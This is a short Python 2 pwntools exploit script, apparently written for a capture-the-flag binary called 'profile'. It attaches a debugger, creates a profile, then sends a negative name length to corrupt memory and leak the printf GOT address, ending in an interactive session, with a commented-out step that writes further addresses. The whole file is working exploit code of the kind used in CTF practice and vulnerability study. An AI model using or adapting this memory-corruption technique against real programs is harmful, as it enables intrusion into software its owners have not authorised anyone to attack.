#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x080488B8'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

def leak(address):
    payload = p32(address) + 'a' * 4 + p32(10)
    #io.recv()
    io.sendline('3')
    io.recvuntil('Input your new namelen:\n')
    io.sendline('-10')
    io.recvuntil('Input your name:\n')
    io.sendline(payload)
    io.recvuntil('Input your age:\n')
    io.sendline('10')
    io.recvuntil('Update succeeded\n')

    io.recvuntil(">")
    io.sendline('2')
    data=io.recv().splitlines()[0][11:15][::-1]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data

elf = ELF('/home/h11p/hackme/huxiangbei/profile')
printf_addr=elf.got['printf']

io = process('/home/h11p/hackme/huxiangbei/profile')




debug()

io.recvuntil('>')
io.sendline("1")
io.recvuntil("Input your name len:\n")
io.sendline("10")
io.recvuntil('Input your name:\n')
io.sendline('a'*8)
io.recvuntil('Input your age:\n')
io.sendline('1'*12)
io.recvuntil('Profile Created\n')

print "0x"+leak(printf_addr)



'''
io.sendline("4")
io.recvuntil('Person 1:')
io.send(p32(0x0804B080))
io.recvuntil('Person 2:')
io.send(p32(0x0804B084))
'''


io.interactive()
io.close()

